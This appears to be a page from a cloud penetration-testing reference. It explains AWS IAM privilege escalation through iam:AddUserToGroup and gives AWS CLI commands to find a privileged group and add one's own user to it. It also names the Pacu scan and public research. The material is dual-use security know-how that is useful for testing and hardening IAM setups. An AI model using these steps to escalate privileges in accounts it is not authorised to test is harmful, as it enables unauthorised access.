---
title: "Group membership: add yourself to a more privileged group"
description: "iam:AddUserToGroup to join a group that carries more permissions than your current principal."
keywords:
  - AddUserToGroup
  - group membership
  - privilege escalation
  - IAM
  - group
---

# Group membership

A user inherits every policy attached to the groups it belongs to. `iam:AddUserToGroup` lets you add your user to any group, so joining a more privileged group (an admins group, or one with a broad attached policy) promotes you in a single call.

## Join a privileged group

```bash
aws iam list-groups                       # find a group with strong policies
aws iam list-attached-group-policies --group-name <group>
aws iam add-user-to-group --group-name <group> --user-name <you>
```

## Exploitation notes

- The inherited permissions apply immediately to new sessions; refresh credentials if a cached session predates the change.
- This differs from [AttachGroupPolicy](policy-manipulation/attach-group-policy.md): here the group is already privileged and you simply join it.

## Tools

- **AWS CLI** (`iam add-user-to-group`).
- **Pacu** (`iam__privesc_scan`).

## References

- [Rhino Security Labs: AWS privilege escalation (AddUserToGroup)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
